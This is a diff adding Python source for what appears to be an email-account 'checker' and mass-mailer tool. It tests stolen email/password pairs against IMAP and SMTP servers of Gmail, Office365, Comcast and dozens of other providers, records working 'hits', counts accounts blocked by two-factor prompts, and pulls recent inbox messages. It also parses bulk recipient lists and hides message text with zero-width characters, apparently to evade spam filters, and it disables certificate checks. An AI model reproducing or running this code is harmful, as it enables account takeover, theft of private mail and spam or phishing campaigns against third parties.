@@ -1,0 +1,1638 @@
+<style>, <script>, and <svg> blocks so we don't inject inside them
+    hidden = {}
+    def hide(m):
+        k = f"__HIDDEN_{len(hidden)}__"
+        hidden[k] = m.group(0)
+        return k
+    
+    html = re.sub(r'(?is)<(script|style|svg).*?>.*?</\1>', hide, html)
+    hidden_keys = set(hidden.keys())
+    _placeholder_re = re.compile(r'(__HIDDEN_\d+__)')
+
+    def _obfuscate_text(text: str) -> str:
+        # A text node may contain several placeholders back-to-back; obfuscate around them only.
+        parts = _placeholder_re.split(text)
+        out = []
+        for part in parts:
+            if part in hidden_keys:
+                out.append(part)
+            elif part:
+                out.append(re.sub(r'(\w{4,})', lambda w: '\u200c'.join(list(w.group(0))), part))
+        return ''.join(out)
+
+    result = []
+    last = 0
+    for m in re.finditer(r'<[^>]+>', html):           # walk over every HTML tag
+        text_node = html[last:m.start()]               # text between previous tag end and this tag start
+        if text_node.strip():                          # only touch non-empty text nodes
+            result.append(_obfuscate_text(text_node))
+        else:
+            result.append(text_node)
+        result.append(m.group(0))                      # keep the tag byte-perfect
+        last = m.end()
+    tail = html[last:]                                 # text after the final tag
+    if tail.strip():
+        result.append(_obfuscate_text(tail))
+    else:
+        result.append(tail)
+        
+    html = ''.join(result)
+    # Restore hidden tags
+    for k, v in hidden.items():
+        html = html.replace(k, v)
+    return html
+
+def _svg_to_email_img(html: str) -> str:
+    """Gmail/Outlook often drop inline <svg>; embed each SVG as a base64 <img> instead."""
+    import base64
+
+    def repl(m):
+        svg = m.group(0)
+        b64 = base64.b64encode(svg.encode('utf-8')).decode('ascii')
+        cls_m = re.search(r'class="([^"]*)"', svg)
+        cls = cls_m.group(1) if cls_m else ''
+        if 'emblem' in cls:
+            w, h = '70', '70'
+        else:
+            w, h = '18', '18'
+        return (
+            f'<img src="data:image/svg+xml;base64,{b64}" alt="" width="{w}" height="{h}" '
+            f'style="width:{w}px;height:{h}px;display:inline-block;vertical-align:middle;" />'
+        )
+
+    return re.sub(r'(?is)<svg\b[^>]*>.*?</svg>', repl, html)
+
+def prepare_html_for_email(html: str) -> str:
+    """Normalize HTML before SMTP send: drop scripts, obfuscate text, fix SVG for clients."""
+    html = re.sub(r'(?is)<script\b[^>]*>.*?</script>', '', html)
+    html = obfuscate_html(html)
+    html = _svg_to_email_img(html)
+    return html
+
+def parse_email_targets(raw_targets) -> list:
+    """Split recipient lists from newlines, commas, or semicolons."""
+    targets = []
+    for item in raw_targets or []:
+        for part in re.split(r'[,;\s]+', str(item).strip()):
+            addr = part.strip().strip(',;')
+            if addr and '@' in addr:
+                targets.append(addr)
+    return list(dict.fromkeys(targets))
+
+def parse_email_company_pairs(raw_targets, raw_companies=None) -> list:
+    """
+    Parse recipient email, company, and subject.
+    Supports:
+    1) Tab-separated/Excel or space-separated format: `email  company  subject` or `email\tcompany\tsubject`
+    2) Delimited format: `email:company:subject` or `email|company|subject`
+    3) Separate lists for emails, companies, and subjects
+    """
+    if isinstance(raw_targets, str):
+        target_lines = [line.strip() for line in raw_targets.splitlines() if line.strip()]
+    elif isinstance(raw_targets, list):
+        target_lines = []
+        for item in raw_targets:
+            for line in str(item).splitlines():
+                if line.strip():
+                    target_lines.append(line.strip())
+    else:
+        target_lines = []
+
+    companies_list = []
+    if raw_companies:
+        if isinstance(raw_companies, str):
+            companies_list = [c.strip() for c in raw_companies.splitlines() if c.strip()]
+        elif isinstance(raw_companies, list):
+            for c in raw_companies:
+                for line in str(c).splitlines():
+                    if line.strip():
+                        companies_list.append(line.strip())
+
+    pairs = []
+
+    for idx, line in enumerate(target_lines):
+        sublines = re.split(r'[\r\n]+', line)
+        for sline in sublines:
+            sline = sline.strip()
+            if not sline:
+                continue
+            
+            email = ""
+            company = ""
+            subject = ""
+
+            # Check 1: Tab-separated or 2+ spaces (Excel column copy-paste)
+            parts = re.split(r'\t|\s{2,}', sline)
+            parts = [p.strip() for p in parts if p.strip()]
+            
+            if len(parts) >= 3 and '@' in parts[0]:
+                email = parts[0]
+                company = parts[1]
+                subject = parts[2]
+            elif len(parts) == 2 and '@' in parts[0]:
+                email = parts[0]
+                company = parts[1]
+            elif len(parts) == 1 and '@' in parts[0]:
+                email = parts[0]
+            else:
+                match_delim3 = re.search(r'^([^\s:,;|\t]+@[^\s:,;|\t]+\.[^\s:,;|\t]+)\s*[:|;]\s*([^:|;]+)\s*[:|;]\s*(.+)$', sline)
+                match_delim2 = re.search(r'^([^\s:,;|\t]+@[^\s:,;|\t]+\.[^\s:,;|\t]+)\s*[:|;]\s*(.+)$', sline)
+                
+                if match_delim3:
+                    email = match_delim3.group(1).strip()
+                    company = match_delim3.group(2).strip()
+                    subject = match_delim3.group(3).strip()
+                elif match_delim2:
+                    email = match_delim2.group(1).strip()
+                    company = match_delim2.group(2).strip()
+                else:
+                    email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', sline)
+                    if email_match:
+                        email = email_match.group(1).strip()
+                        rest = sline.replace(email, "").strip()
+                        if rest:
+                            company = re.sub(r'^[:|,;\s\t]+', '', rest).strip()
+                        else:
+                            if idx < len(companies_list):
+                                company = companies_list[idx]
+
+            if email and not company:
+                if idx < len(companies_list):
+                    company = companies_list[idx]
+
+            if email:
+                pairs.append({
+                    "email": email,
+                    "company": company,
+                    "subject": subject
+                })
+
+    return pairs
+
+def replace_dynamic_tags(text: str, email: str, company: str) -> str:
+    """Replace dynamic placeholders like {company}, [company], {email}, {domain}."""
+    if not text:
+        return ""
+    domain = email.split('@')[-1] if '@' in email else ""
+    tags = {
+        '{company}': company,
+        '{Company}': company,
+        '{COMPANY}': company.upper() if company else "",
+        '[company]': company,
+        '[Company]': company,
+        '[COMPANY]': company.upper() if company else "",
+        '{company_name}': company,
+        '[company_name]': company,
+        '{email}': email,
+        '[email]': email,
+        '{domain}': domain,
+        '[domain]': domain
+    }
+    for tag, val in tags.items():
+        text = text.replace(tag, val)
+    return text
+
+
+def html_to_plain(html: str) -> str:
+    """Convert HTML to plain text fallback by stripping tags and completely removing CSS/JS."""
+    text = re.sub(r'(?is)<(script|style).*?>.*?</\1>', '', html)
+    text = re.sub(r'<[^>]+>', '', text)
+    text = text.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&gt;', '>').replace('&lt;', '<')
+    return '\n'.join(line.strip() for line in text.split('\n') if line.strip())
+
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+from email.utils import formatdate, make_msgid, formataddr
+from dns import resolver # pyre-ignore[09005e78-c4d8-4191-9ef2-44cbce1f9c5c]
+import dns.resolver # pyre-ignore[5c18690a-8490-421f-887c-4f9a64902447]
+import typing
+from concurrent.futures import ThreadPoolExecutor
+from fastapi import FastAPI, WebSocket, Request, BackgroundTasks # pyre-ignore[a78d055d-b385-40b6-8a8b-ad3c86609d19]
+from fastapi.responses import HTMLResponse, JSONResponse, FileResponse # pyre-ignore[fad9c3b7-5d82-411c-bc96-2b1f113d2562]
+from email.header import decode_header, Header
+from email import message_from_bytes
+from typing import List, Dict, Any, Union
+from contextlib import asynccontextmanager
+try:
+    from playwright.async_api import async_playwright
+    from playwright_stealth import Stealth
+except ImportError:
+    async_playwright = None # type: ignore
+    Stealth = None # type: ignore
+
+# Check for extra dependencies for new check functions
+try:
+    from requests_html import AsyncHTMLSession # pyre-ignore[f602693a-497f-4196-a043-c18e5dbfd945]
+except ImportError:
+    AsyncHTMLSession = None
+
+try:
+    import socks # pyre-ignore[missing-module-attribute]
+except ImportError:
+    socks = None # pyre-ignore[assignment]
+
+# --- LOGGING ---
+logging.basicConfig(level=logging.ERROR)
+logger = logging.getLogger("MailDiggerPro")
+
+# --- UTILITIES ---
+uaLst = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
+]
+
+def randstr(length=20):
+    return ''.join(random.choices(s.ascii_letters + s.digits, k=length))
+
+
+# --- CONFIGURATION ---
+SIGNATURE = "@Hamzatostospospos"
+DB_PATH = 'mail_settings.db'; VALID_PATH = 'Valid.txt'
+HITS_FOLDER = 'Hits_by_Keyword'; COOKIES_FOLDER = 'cookies'
+SENT_LOG_FILE = 'sent_emails.log'
+
+# ============================================
+# ENHANCED CLASSES & FUNCTIONS (v12.2 OMEGA+)
+# ============================================
+
+class MailAccessChecker:
+    """Advanced mail access verification with multiple methods"""
+    
+    @staticmethod
+    def check_imap_access(email: str, password: str, domain: str = None) -> Dict[str, Any]:
+        """Check IMAP access with multiple ports and security protocols with retries"""
+        if not domain:
+            domain = email.split('@')[1]
+        
+        result = {
+            "email": email,
+            "method": "IMAP",
+            "accessible": False,
+            "servers_tried": [],
+            "details": {},
+            "error": "No servers reached"
+        }
+        
+        servers = KNOWN_IMAP_SERVERS.get(domain, [("imap." + domain, 993)])
+        
+        for server, port in servers:
+            result["servers_tried"].append(f"{server}:{port}")
+            
+            def _attempt_login():
+                imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=state.timeout)
+                imap_conn.login(email, password)
+                imap_conn.select('INBOX', readonly=True)
+                return imap_conn
+
+            try:
+                imap_conn = safe_execute_with_retry(_attempt_login)
+                result["accessible"] = True
+                result["details"] = {
+                    "server": server,
+                    "port": port,
+                    "capabilities": str(imap_conn.capabilities())
+                }
+                result["error"] = None
+                imap_conn.logout()
+                break
+            except imaplib.IMAP4.error as e:
+                err_str = str(e).lower()
+                result["error"] = f"Login Failed: {str(e)}"
+                if "web login required" in err_str or "second factor required" in err_str or "challenge required" in err_str or "application-specific password required" in err_str or "app-specific password" in err_str:
+                    with state.lock: state.two_factor += 1
+            except socket.timeout:
+                result["error"] = "Connection Timeout"
+            except Exception as e:
+                err_str = str(e).lower()
+                result["error"] = str(e)
+                if "web login required" in err_str or "second factor required" in err_str or "challenge required" in err_str or "application-specific password required" in err_str:
+                    with state.lock: state.two_factor += 1
+        
+        return result
+    
+    @staticmethod
+    def check_smtp_access(email: str, password: str, domain: str = None) -> Dict[str, Any]:
+        """Check SMTP access with multiple configurations and retries"""
+        if not domain:
+            domain = email.split('@')[1]
+        
+        result = {
+            "email": email,
+            "method": "SMTP",
+            "accessible": False,
+            "servers_tried": [],
+            "details": {},
+            "error": "No servers reached"
+        }
+        
+        config = SMTP_CONFIGS.get(domain, {})
+        servers = config.get("servers", [("smtp." + domain, 587, "TLS")])
+        
+        for server, port, security in servers:
+            result["servers_tried"].append(f"{server}:{port} ({security})")
+            
+            def _attempt_smtp():
+                if security == "SSL":
+                    smtp_conn = smtplib.SMTP_SSL(server, port, context=ctx, timeout=state.timeout)
+                else:
+                    smtp_conn = smtplib.SMTP(server, port, timeout=state.timeout)
+                    smtp_conn.starttls(context=ctx)
+                
+                smtp_conn.login(email, password)
+                return smtp_conn
+
+            try:
+                smtp_conn = safe_execute_with_retry(_attempt_smtp)
+                result["accessible"] = True
+                result["details"] = {
+                    "server": server,
+                    "port": port,
+                    "security": security
+                }
+                result["error"] = None
+                smtp_conn.quit()
+                break
+            except smtplib.SMTPAuthenticationError:
+                result["error"] = "Authentication Failed"
+            except socket.timeout:
+                result["error"] = "Connection Timeout"
+            except Exception as e:
+                result["error"] = str(e)
+        
+        return result
+    
+    @staticmethod
+    def check_inbox_access(email: str, password: str) -> Dict[str, Any]:
+        """Check inbox read access and return full extraction (headers, body, attachments)"""
+        result = {
+            "email": email,
+            "can_read_inbox": False,
+            "message_count": 0,
+            "messages": [],
+            "error": None
+        }
+        
+        domain = email.split('@')[1]
+        imap_check = MailAccessChecker.check_imap_access(email, password, domain)
+        
+        if imap_check["accessible"]:
+            try:
+                server = imap_check["details"]["server"]
+                port = imap_check["details"]["port"]
+                
+                def _do_fetch():
+                    imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=state.timeout)
+                    imap_conn.login(email, password)
+                    return imap_conn
+
+                imap_conn = safe_execute_with_retry(_do_fetch)
+                
+                status, mailboxes = imap_conn.list()
+                result["mailboxes"] = [m.decode('utf-8') if isinstance(m, bytes) else m for m in mailboxes]
+                
+                status, count = imap_conn.select('INBOX')
+                if status == 'OK':
+                    result["can_read_inbox"] = True
+                    result["message_count"] = int(count[0])
+                    
+                    # Fetch last 5 messages with full extraction
+                    if result["message_count"] > 0:
+                        fetch_limit = min(5, result["message_count"])
+                        status, data = imap_conn.search(None, 'ALL')
+                        ids = data[0].split()
+                        for msg_id in ids[-fetch_limit:]:
+                            res, msg_data = imap_conn.fetch(msg_id, '(RFC822)')
+                            msg = message_from_bytes(msg_data[0][1])
+                            
+                            # Extract body
+                            body = ""
+                            html = ""
+                            attachments = []
+                            if msg.is_multipart():
+                                for part in msg.walk():
+                                    ctype = part.get_content_type()
+                                    cdisp = str(part.get('Content-Disposition'))
+                                    if ctype == 'text/plain' and 'attachment' not in cdisp:
+                                        body += part.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                    elif ctype == 'text/html' and 'attachment' not in cdisp:
+                                        html += part.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                    elif 'attachment' in cdisp:
+                                        attachments.append(part.get_filename())
+                            else:
+                                body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
+                                
+                            result["messages"].append({
+                                "id": msg_id.decode(),
+                                "from": clean_s(msg.get('From')),
+                                "sub": clean_s(msg.get('Subject')),
+                                "date": clean_s(msg.get('Date')),
+                                "body": body[:500] + "..." if len(body) > 500 else body,
+                                "has_html": bool(html),
+                                "attachments": attachments
+                            })
+                
+                imap_conn.logout()
+            except Exception as e:
+                result["error"] = str(e)
+        else:
+            result["error"] = imap_check.get("error", "Access failed")
+        
+        return result
+
+class ComcastMailChecker:
+    """Specialized checker for Comcast email accounts"""
+    
+    @staticmethod
+    def check_imap(email: str, password: str) -> Dict[str, Any]:
+        """Check Comcast IMAP access (imap.comcast.net:993)"""
+        result = {
+            "email": email,
+            "provider": "Comcast",
+            "method": "IMAP",
+            "accessible": False,
+            "server": "imap.comcast.net",
+            "port": 993
+        }
+        
+        try:
+            imap_conn = imaplib.IMAP4_SSL("imap.comcast.net", 993, ssl_context=ctx, timeout=15)
+            imap_conn.login(email, password)
+            
+            status, mailboxes = imap_conn.list()
+            result["accessible"] = True
+            result["mailboxes"] = [m.decode('utf-8') if isinstance(m, bytes) else m for m in mailboxes]
+            
+            imap_conn.logout()
+        except:
+            result["error"] = "Invalid credentials or connection failed"
+        
+        return result
+    
+    @staticmethod
+    def check_smtp(email: str, password: str) -> Dict[str, Any]:
+        """Check Comcast SMTP access (smtp.comcast.net:587 or 465)"""
+        result = {
+            "email": email,
+            "provider": "Comcast",
+            "method": "SMTP",
+            "accessible": False,
+            "servers_tested": []
+        }
+        
+        for port, security in [(587, "TLS"), (465, "SSL")]:
+            try:
+                result["servers_tested"].append(f"smtp.comcast.net:{port} ({security})")
+                
+                if security == "SSL":
+                    smtp_conn = smtplib.SMTP_SSL("smtp.comcast.net", port, context=ctx, timeout=15)
+                else:
+                    smtp_conn = smtplib.SMTP("smtp.comcast.net", port, timeout=15)
+                    smtp_conn.starttls(context=ctx)
+                
+                smtp_conn.login(email, password)
+                result["accessible"] = True
+                result["server"] = "smtp.comcast.net"
+                result["port"] = port
+                result["security"] = security
+                smtp_conn.quit()
+                break
+            except:
+                result["error"] = "Connection failed"
+        
+        return result
+    
+    @staticmethod
+    def full_check(email: str, password: str) -> Dict[str, Any]:
+        """Full Comcast account check (IMAP + SMTP)"""
+        return {
+            "email": email,
+            "provider": "Comcast",
+            "imap_check": ComcastMailChecker.check_imap(email, password),
+            "smtp_check": ComcastMailChecker.check_smtp(email, password),
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+
+class OfficeMailChecker:
+    """Specialized checker for Office365/Outlook accounts"""
+    
+    @staticmethod
+    def check_imap(email: str, password: str) -> Dict[str, Any]:
+        """Check Office365 IMAP access"""
+        result = {
+            "email": email,
+            "provider": "Office365",
+            "method": "IMAP",
+            "accessible": False,
+            "servers_tested": []
+        }
+        
+        servers = [
+            ("outlook.office365.com", 993),
+            ("imap-mail.outlook.com", 993),
+            ("smtp.office365.com", 993)
+        ]
+        
+        for server, port in servers:
+            result["servers_tested"].append(f"{server}:{port}")
+            try:
+                imap_conn = imaplib.IMAP4_SSL(server, port, ssl_context=ctx, timeout=15)
+                imap_conn.login(email, password)
+                result["accessible"] = True
+                result["server"] = server
+                result["port"] = port
+                imap_conn.logout()
+                break
+            except:
+                result["error"] = "Connection failed"
+        
+        return result
+    
+    @staticmethod
+    def check_smtp(email: str, password: str) -> Dict[str, Any]:
+        """Check Office365 SMTP access"""
+        result = {
+            "email": email,
+            "provider": "Office365",
+            "method": "SMTP",
+            "accessible": False,
+            "servers_tested": []
+        }
+        
+        servers = [
+            ("smtp.office365.com", 587),
+            ("smtp-mail.outlook.com", 587),
+            ("smtp.office365.com", 465)
+        ]
+        
+        for server, port in servers:
+            result["servers_tested"].append(f"{server}:{port}")
+            try:
+                smtp_conn = smtplib.SMTP(server, port, timeout=15)
+                smtp_conn.starttls(context=ctx)
+                smtp_conn.login(email, password)
+                result["accessible"] = True
+                result["server"] = server
+                result["port"] = port
+                smtp_conn.quit()
+                break
+            except:
+                result["error"] = "Connection failed"
+        
+        return result
+
+class GmailMailChecker:
+    """Specialized checker for Gmail accounts (No WebAuth/OAuth required)"""
+    
+    @staticmethod
+    def check_imap(email: str, password: str) -> Dict[str, Any]:
+        """Check Gmail IMAP access (imap.gmail.com:993)"""
+        result = {
+            "email": email,
+            "provider": "Gmail",
+            "method": "IMAP",
+            "accessible": False,
+            "server": "imap.gmail.com",
+            "port": 993
+        }
+        
+        try:
+            imap_conn = imaplib.IMAP4_SSL("imap.gmail.com", 993, ssl_context=ctx, timeout=15)
+            imap_conn.login(email, password)
+            
+            status, mailboxes = imap_conn.list()
+            result["accessible"] = True
+            result["mailboxes"] = [m.decode('utf-8') if isinstance(m, bytes) else m for m in mailboxes]
+            
+            imap_conn.logout()
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    @staticmethod
+    def check_smtp(email: str, password: str) -> Dict[str, Any]:
+        """Check Gmail SMTP access (smtp.gmail.com:587 or 465)"""
+        result = {
+            "email": email,
+            "provider": "Gmail",
+            "method": "SMTP",
+            "accessible": False,
+            "servers_tested": []
+        }
+        
+        for port, security in [(587, "TLS"), (465, "SSL")]:
+            try:
+                result["servers_tested"].append(f"smtp.gmail.com:{port} ({security})")
+                
+                if security == "SSL":
+                    smtp_conn = smtplib.SMTP_SSL("smtp.gmail.com", port, context=ctx, timeout=15)
+                else:
+                    smtp_conn = smtplib.SMTP("smtp.gmail.com", port, timeout=15)
+                    smtp_conn.starttls(context=ctx)
+                
+                smtp_conn.login(email, password)
+                result["accessible"] = True
+                result["server"] = "smtp.gmail.com"
+                result["port"] = port
+                result["security"] = security
+                smtp_conn.quit()
+                break
+            except Exception as e:
+                result["error"] = str(e)
+        
+        return result
+    
+    @staticmethod
+    def full_check(email: str, password: str) -> Dict[str, Any]:
+        """Full Gmail account check (IMAP + SMTP)"""
+        return {
+            "email": email,
+            "provider": "Gmail",
+            "imap_check": GmailMailChecker.check_imap(email, password),
+            "smtp_check": GmailMailChecker.check_smtp(email, password),
+            "timestamp": datetime.datetime.now().isoformat()
+        }
+
+def log_sent_email(sender: str, recipient: str, subject: str, body: str, 
+                   status: str, server: str, port: int):
+    """Log sent email to database and file"""
+    conn = sqlite3.connect(DB_PATH)
+    cursor = conn.cursor()
+    cursor.execute("""INSERT INTO sent_emails 
+                     (sender, recipient, subject, body, sent_time, delivery_status, server, port) 
+                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
+                   (sender, recipient, subject, body, datetime.datetime.now().isoformat(), status, server, port))
+    conn.commit()
+    conn.close()
+    
+    # Also log to file
+    with open(SENT_LOG_FILE, 'a') as f:
+        f.write(f"[{datetime.datetime.now().isoformat()}] FROM: {sender} TO: {recipient} | "
+                f"SERVER: {server}:{port} | STATUS: {status}\n")
+
+# Relaxed SSL for custom domains
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+for folder in [HITS_FOLDER, COOKIES_FOLDER]:
+    if not os.path.exists(folder): os.makedirs(folder)
+
+def clean_s(s: Any) -> str:
+    if s is None: return ""
+    s = str(s)
+    try:
+        parts = decode_header(s)
+        decoded = ""
+        for part, enc in parts:
+            if isinstance(part, bytes):
+                try:
+                    encoding = enc if enc and str(enc).lower() not in ('unknown-8bit', 'unknown') else 'utf-8'
+                    decoded += part.decode(encoding, errors='ignore')
+                except (LookupError, UnicodeDecodeError):
+                    decoded += part.decode('utf-8', errors='ignore')
+            else:
+                decoded += str(part)
+        s = decoded
+    except Exception:
+        pass
+    return s.replace('\u0000','').strip()
+
+def format_header_subject(subj_str: str) -> str:
+    """Formats and encodes subject strings safely for SMTP MIME headers, handling unicode, borders, newlines, and spintax."""
+    if not subj_str:
+        return ""
+    subj_str = str(subj_str).replace('\r\n', '\n').replace('\r', '\n')
+    # If raw HTML tags like <div style="..."> are in subject, clean raw HTML tags
+    if re.search(r'<(div|span|p|b|i|style|html|body|table|tr|td|font)[^>]*>', subj_str, re.IGNORECASE):
+        subj_str = re.sub(r'<[^>]+>', '', subj_str).strip()
+    try:
+        subj_str.encode('ascii')
+        if '\n' in subj_str:
+            folded = '\n '.join(subj_str.split('\n'))
+            return Header(folded, 'ascii').encode()
+        return subj_str
+    except UnicodeEncodeError:
+        if '\n' in subj_str:
+            lines = [Header(l, 'utf-8').encode() for l in subj_str.split('\n') if l]
+            return '\n '.join(lines)
+        return Header(subj_str, 'utf-8').encode()
+
+# --- DATABASE / PROVIDERS ---
+def init_db():
+    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
+    cursor.execute("CREATE TABLE IF NOT EXISTS providers (domain TEXT PRIMARY KEY, imap_host TEXT, imap_port INTEGER, pop_host TEXT, pop_port INTEGER, smtp_host TEXT, smtp_port INTEGER)")
+    cursor.execute("CREATE TABLE IF NOT EXISTS hits_history (user TEXT, pass TEXT, srv TEXT, proto TEXT, time TEXT, UNIQUE(user, pass))")
+    cursor.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
+    
+    # Default settings
+    default_settings = [
+        ('max_retries', '3'),
+        ('retry_delay', '2'),
+        ('timeout', '15')
+    ]
+    for key, val in default_settings:
+        cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (key, val))
+    
+    conn.commit(); conn.close()
+
+def get_provider(domain: str):
+    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
+    cursor.execute("SELECT imap_host, imap_port, pop_host, pop_port, smtp_host, smtp_port FROM providers WHERE domain=?", (domain.lower(),))
+    res = cursor.fetchone(); conn.close()
+    return res
+
+def save_provider(domain: str, ih: str, ip: int, ph: str, pp: int, sh: str, sp: int):
+    conn = sqlite3.connect(DB_PATH); cursor = conn.cursor()
+    cursor.execute("INSERT OR REPLACE INTO providers (domain, imap_host, imap_port, pop_host, pop_port, smtp_host, smtp_port) VALUES (?, ?, ?, ?, ?, ?, ?)", (domain.lower(), ih, ip, ph, pp, sh, sp))
+    conn.commit(); conn.close()
+
+MICROSOFT = ["office365", "outlook", "hotmail", "live"]
+GMAIL = ["gmail", "googlemail"]
+
+# --- KNOWN IMAP SERVERS (shared by discover_server and check_imap_access) ---
+KNOWN_IMAP_SERVERS = {
+    "gmail.com": [("imap.gmail.com", 993), ("imap.gmail.com", 587)],
+    "googlemail.com": [("imap.gmail.com", 993)],
+    "outlook.com": [("outlook.office365.com", 993), ("imap-mail.outlook.com", 993)],
+    "hotmail.com": [("outlook.office365.com", 993), ("imap-mail.outlook.com", 993)],
+    "live.com": [("outlook.office365.com", 993)],
+    "yahoo.com": [("imap.mail.yahoo.com", 993), ("imap.yahoo.com", 993)],
+    "ymail.com": [("imap.mail.yahoo.com", 993)],
+    "aol.com": [("imap.aol.com", 993)],
+    "comcast.net": [("imap.comcast.net", 993)],
+    "comcast.com": [("imap.comcast.net", 993)],
+    "xfinity.com": [("imap.comcast.net", 993)],
+    "att.net": [("imap.mail.att.net", 993)],
+    "sbcglobal.net": [("imap.mail.att.net", 993)],
+    "bellsouth.net": [("imap.mail.att.net", 993)],
+    "charter.net": [("mobile.charter.net", 993)],
+    "spectrum.net": [("mobile.charter.net", 993)],
+    "cox.net": [("imap.cox.net", 993)],
+    "centurylink.net": [("imap.centurylink.net", 993)],
+    "optonline.net": [("mail.optonline.net", 993)],
+    "earthlink.net": [("imap.earthlink.net", 993)],
+    "netzero.net": [("imap.netzero.net", 993)],
+    "mail.ru": [("imap.mail.ru", 993)],
+    "bk.ru": [("imap.mail.ru", 993)],
+    "list.ru": [("imap.mail.ru", 993)],
+    "inbox.ru": [("imap.mail.ru", 993)],
+    "yandex.ru": [("imap.yandex.ru", 993)],
+    "rambler.ru": [("imap.rambler.ru", 993)],
+    "proton.me": [("imap.protonmail.com", 993)],
+    "protonmail.com": [("imap.protonmail.com", 993)],
+    "zoho.com": [("imap.zoho.com", 993)],
+    "libero.it": [("imapmail.libero.it", 993)],
+    "virgilio.it": [("in.virgilio.it", 993)],
+    "alice.it": [("in.alice.it", 143)],
+    "tiscali.it": [("imap.tiscali.it", 993)],
+    "laposte.net": [("imap.laposte.net", 993)],
+    "bol.com.br": [("imap.bol.com.br", 993)],
+    "uol.com.br": [("imap.uol.com.br", 993)],
+    "terra.com.br": [("imap.terra.com.br", 993)],
+    "mynet.com": [("imap.mynet.com", 993)],
+    "onet.pl": [("imap.poczta.onet.pl", 993)],
+    "wp.pl": [("imap.wp.pl", 993)],
+    "seznam.cz": [("imap.seznam.cz", 993)],
+    "email.cz": [("imap.seznam.cz", 993)],
+    "post.cz": [("imap.seznam.cz", 993)],
+    "gmx.de": [("imap.gmx.net", 993)],
+    "gmx.net": [("imap.gmx.net", 993)],
+    "gmx.at": [("imap.gmx.net", 993)],
+    "web.de": [("imap.web.de", 993)],
+    "freenet.de": [("mx.freenet.de", 993)],
+    "t-online.de": [("secureimap.t-online.de", 993)],
+    "arcor.de": [("imap.arcor.de", 993)],
+    "posteo.de": [("posteo.de", 993)],
+    "mailbox.org": [("imap.mailbox.org", 993)],
+    "vodafone.de": [("imap.vodafone.de", 993)],
+    "free.fr": [("imap.free.fr", 993)],
+    "orange.fr": [("imap.orange.fr", 993)],
+    "sfr.fr": [("imap.sfr.fr", 993)],
+    "btinternet.com": [("mail.btinternet.com", 993)],
+    "sky.com": [("imap.tools.sky.com", 993)],
+    "talktalk.net": [("imap.talktalk.net", 993)],
+    "bell.net": [("imaphm.sympatico.ca", 993)],
+    "sympatico.ca": [("imaphm.sympatico.ca", 993)],
+    "cogeco.ca": [("imap.cogeco.ca", 993)],
+    "videotron.ca": [("imap.videotron.ca", 993)],
+    "shaw.ca": [("imap.shaw.ca", 993)],
+    "telus.net": [("imap.telus.net", 993)],
+    "rogers.com": [("imap.mail.yahoo.com", 993)],
+    "telenet.be": [("imap.telenet.be", 993)],
+    "bluewin.ch": [("imaps.bluewin.ch", 993)],
+    "walla.co.il": [("imap.walla.co.il", 993)],
+    "walla.com": [("imap.walla.co.il", 993)],
+    "bezeqint.net": [("imap.bezeqint.net", 993)],
+    "o2.pl": [("poczta.o2.pl", 993)],
+    "rediffmail.com": [("imap.rediffmail.com", 993)],
+    "centrum.cz": [("imap.centrum.cz", 993)],
+    "eircom.net": [("imap.eircom.net", 993)],
+}
+
+SMTP_CONFIGS = {
+    "hotmail.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp-mail.outlook.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 300},
+    "outlook.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp-mail.outlook.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 300},
+    "live.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp-mail.outlook.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL")], "type": "Microsoft", "limit": 300},
+    "office365.com": {"servers": [("smtp.office365.com", 587, "TLS"), ("smtp.office365.com", 465, "SSL"), ("smtp-mail.outlook.com", 587, "TLS")], "type": "Microsoft", "limit": 1000},
+    "gmail.com": {"servers": [("smtp.gmail.com", 587, "TLS"), ("smtp.gmail.com", 465, "SSL")], "type": "Gmail", "limit": 500},
+    "yahoo.com": {"servers": [("smtp.mail.yahoo.com", 465, "SSL")], "type": "Yahoo", "limit": 700},
+    "onet.pl": {"servers": [("smtp.poczta.onet.pl", 587, "TLS")], "type": "Onet", "limit": 1000},
+    "t-online.de": {"servers": [("securesmtp.t-online.de", 587, "TLS")], "type": "T-Online", "limit": 1000},
+    "netzero.net": {"servers": [("smtp.netzero.net", 587, "TLS")], "type": "Netzero", "limit": 500},
+    "rediffmail.com": {"servers": [("smtp.rediffmail.com", 587, "TLS")], "type": "Rediff", "limit": 500},
+    "centrum.cz": {"servers": [("smtp.centrum.cz", 587, "TLS")], "type": "Centrum", "limit": 500},
+    "eircom.net": {"servers": [("mail.eircom.net", 587, "TLS")], "type": "Eircom", "limit": 500},
